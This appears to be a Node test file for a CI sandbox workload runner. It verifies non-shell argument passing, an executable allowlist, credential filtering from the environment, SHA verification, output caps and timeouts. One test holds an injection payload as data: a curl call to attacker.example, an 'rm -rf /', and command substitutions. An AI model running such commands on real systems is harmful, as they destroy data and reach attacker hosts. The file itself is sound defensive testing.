/**
 * Real, live tests of ops/runner-agent/workload-runner.cjs - the actual file that gets embedded and
 * run inside a real Cloudflare Sandbox container. These tests invoke the REAL .cjs file as a real
 * subprocess (node ops/runner-agent/workload-runner.cjs <spec-file>), not a reimplementation - the
 * exact same code path production uses. uid/gid drop-privilege behavior is POSIX-only and cannot be
 * verified on this Windows dev machine (Node silently ignores uid/gid on win32) - that specific
 * property is verified separately, live, inside the real deployed container (R2 Part 6's own evidence).
 */
import assert from "node:assert/strict";
import { describe, it } from "node:test";
import { execFileSync } from "node:child_process";
import { writeFileSync, rmSync, mkdtempSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { fileURLToPath } from "node:url";

const REPO_ROOT = fileURLToPath(new URL("../..", import.meta.url));
const WORKLOAD_RUNNER = join(REPO_ROOT, "ops", "runner-agent", "workload-runner.cjs");

it("forwards validated Go context without allowing general environment injection", () => {
  const command = { executable: "node", args: ["-e", "console.log(process.env.GOOS)"], env: { GOOS: "fixture-os" } };
  const result = runWorkloadRunner(baseSpec([command]));
  assert.equal(result.steps[0].stdout.trim(), "fixture-os");
  const rejected = runWorkloadRunner(baseSpec([{ ...command, env: { NODE_OPTIONS: "--inspect" } }]));
  assert.match(rejected.fatalError ?? "", /environment is not allowed/);
});

function runWorkloadRunner(spec: unknown): { steps: Array<{ executable: string; exitCode: number | null; signal: string | null; timedOut: boolean; outputTruncated: boolean; durationMs: number; stdout: string; stderr: string; expectedStdoutMismatch?: boolean }>; failedAtStep: number | null; fatalError?: string } {
  const dir = mkdtempSync(join(tmpdir(), "diffci-workload-runner-test-"));
  const specPath = join(dir, "spec.json");
  try {
    writeFileSync(specPath, JSON.stringify(spec));
    try {
      const stdout = execFileSync("node", [WORKLOAD_RUNNER, specPath], { encoding: "utf8" });
      return JSON.parse(stdout);
    } catch (err) {
      // A fatal validation error (e.g. disallowed executable) makes workload-runner.cjs exit non-zero
      // - execFileSync throws in that case, but the real JSON result is still on the child's stdout.
      const stdout = (err as { stdout?: string }).stdout;
      if (stdout) return JSON.parse(stdout);
      throw err;
    }
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
}

function baseSpec(steps: Array<{ executable: string; args: string[]; cwd?: string; env?: Record<string, string>; expectedStdout?: string }>, overrides: Record<string, unknown> = {}) {
  return { steps, env: { PATH: process.env.PATH }, uid: null, gid: null, timeoutMsPerStep: 5000, maxOutputBytes: 65_536, ...overrides };
}

describe("workload-runner.cjs - Part 3 real non-shell execution", () => {
  it("real proof: an injection-shaped argument arrives as a single literal argv element - no shell is ever invoked", () => {
    const payload = "; curl http://attacker.example/pwned && rm -rf / | cat > /tmp/pwned $(whoami) `id`";
    const result = runWorkloadRunner(baseSpec([{ executable: "node", args: ["-e", "console.log(JSON.stringify(process.argv.slice(1)))", payload] }]));
    assert.equal(result.steps[0]!.exitCode, 0);
    const argv = JSON.parse(result.steps[0]!.stdout.trim());
    assert.deepEqual(argv, [payload]);
  });

  it("multiple steps run in order and all succeed", () => {
    const result = runWorkloadRunner(baseSpec([{ executable: "node", args: ["-e", "console.log('one')"] }, { executable: "node", args: ["-e", "console.log('two')"] }]));
    assert.equal(result.steps.length, 2);
    assert.equal(result.steps[0]!.stdout.trim(), "one");
    assert.equal(result.steps[1]!.stdout.trim(), "two");
    assert.equal(result.failedAtStep, null);
  });

  it("a failing NON-LAST step stops the sequence - later steps never run", () => {
    const result = runWorkloadRunner(baseSpec([{ executable: "node", args: ["-e", "process.exit(1)"] }, { executable: "node", args: ["-e", "console.log('should-never-run')"] }]));
    assert.equal(result.steps.length, 1);
    assert.equal(result.failedAtStep, 0);
  });

  it("a failing LAST step (the real test command) is reported normally, not treated as a setup failure", () => {
    const result = runWorkloadRunner(baseSpec([{ executable: "node", args: ["-e", "console.log('setup-ok')"] }, { executable: "node", args: ["-e", "process.exit(1)"] }]));
    assert.equal(result.steps.length, 2);
    assert.equal(result.steps[1]!.exitCode, 1);
    assert.equal(result.failedAtStep, null, "the final step's own failure is the job's real result, not a pipeline abort");
  });

  it("rejects an executable outside the allowlist as a real, standalone backstop (not just trusting the caller already validated)", () => {
    const result = runWorkloadRunner(baseSpec([{ executable: "bash", args: ["-c", "echo hi"] }]));
    assert.equal(result.fatalError && result.fatalError.includes("not in the allowlist"), true);
  });

  it("R2 Part 8/9/18 real proof: a credential present in the CALLING process's own environment never reaches the spawned workload, even though the caller never lists it anywhere in the job spec", () => {
    // workload-runner.cjs builds the workload's env from ITS OWN process.env via a fixed allowlist -
    // the job spec no longer carries an `env` field at all (removed: trusting a caller-supplied env
    // object was a real, avoidable risk surface). Here the "agent" (this test's own process, standing
    // in for the real bootstrap script) holds a real-shaped secret in ITS environment; the spawned
    // workload process must never see it, by construction, regardless of what the spec says.
    const dir = mkdtempSync(join(tmpdir(), "diffci-workload-runner-test-"));
    const specPath = join(dir, "spec.json");
    try {
      writeFileSync(specPath, JSON.stringify(baseSpec([{ executable: "node", args: ["-e", "console.log(JSON.stringify(process.env))"] }])));
      const stdout = execFileSync("node", [WORKLOAD_RUNNER, specPath], {
        encoding: "utf8",
        env: { ...process.env, PATH: process.env.PATH, DIFFCI_RUNNER_TOKEN: "super-secret-token-value", RUNNER_CONTROL_TOKEN: "also-secret" },
      });
      const result = JSON.parse(stdout) as { steps: Array<{ stdout: string }> };
      const observedWorkloadEnv = JSON.parse(result.steps[0]!.stdout.trim());
      assert.equal(observedWorkloadEnv.DIFFCI_RUNNER_TOKEN, undefined);
      assert.equal(observedWorkloadEnv.RUNNER_CONTROL_TOKEN, undefined);
      assert.ok(observedWorkloadEnv.PATH, "safe, allowlisted keys still pass through");
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe("workload-runner.cjs - Part 11 exact-value verification (e.g. commit SHA)", () => {
  it("a step whose stdout matches expectedStdout passes and does not abort the sequence", () => {
    const result = runWorkloadRunner(baseSpec([{ executable: "node", args: ["-e", "console.log('exact-value')"], expectedStdout: "exact-value" }, { executable: "node", args: ["-e", "console.log('next-step')"] }]));
    assert.equal(result.steps[0]!.expectedStdoutMismatch, false);
    assert.equal(result.steps.length, 2, "the mismatch-free step must not abort the sequence");
  });

  it("a step whose stdout does NOT match expectedStdout is treated as a real failure, aborting the sequence even though exitCode was 0", () => {
    const result = runWorkloadRunner(baseSpec([{ executable: "node", args: ["-e", "console.log('wrong-value')"], expectedStdout: "expected-value" }, { executable: "node", args: ["-e", "console.log('should-never-run')"] }]));
    assert.equal(result.steps[0]!.exitCode, 0, "the process itself succeeded");
    assert.equal(result.steps[0]!.expectedStdoutMismatch, true);
    assert.equal(result.steps.length, 1, "later steps must never run after a mismatch - Part 11: reject mismatch");
    assert.equal(result.failedAtStep, 0);
  });

  it("real regression scenario: git rev-parse HEAD mismatching the requested SHA is rejected before any install/test step runs", () => {
    // Simulates the real acquisition-verification step shape without needing a real git checkout -
    // proves the general mechanism workload-runner.cjs uses for R2's actual SHA check.
    const wrongSha = "0000000000000000000000000000000000000000";
    const expectedSha = "1111111111111111111111111111111111111111";
    const result = runWorkloadRunner(
      baseSpec([
        { executable: "node", args: ["-e", `console.log('${wrongSha}')`], expectedStdout: expectedSha },
        { executable: "npm", args: ["ci", "--ignore-scripts"] },
      ]),
    );
    assert.equal(result.failedAtStep, 0);
    assert.equal(result.steps.length, 1);
  });
});

describe("workload-runner.cjs - Part 19 output limits", () => {
  it("truncates stdout at the configured cap and kills the process rather than letting it run unbounded", () => {
    const result = runWorkloadRunner(baseSpec([{ executable: "node", args: ["-e", "for(let i=0;i<100000;i++)process.stdout.write('x'.repeat(100))"] }], { maxOutputBytes: 1000 }));
    assert.equal(result.steps[0]!.outputTruncated, true);
    assert.ok(result.steps[0]!.stdout.length <= 1000);
    assert.equal(result.steps[0]!.signal, "SIGKILL");
  });
});

describe("workload-runner.cjs - Part 20 execution timeout", () => {
  it("kills a hanging process at the configured timeout - real wall-clock proof, not just a reported flag", () => {
    const start = Date.now();
    const result = runWorkloadRunner(baseSpec([{ executable: "node", args: ["-e", "setTimeout(()=>{}, 60000)"] }], { timeoutMsPerStep: 1200 }));
    const elapsedMs = Date.now() - start;
    assert.equal(result.steps[0]!.timedOut, true);
    assert.equal(result.steps[0]!.signal, "SIGKILL");
    assert.ok(elapsedMs < 10_000, `must not actually wait for the real 60s sleep - took ${elapsedMs}ms`);
  });
});
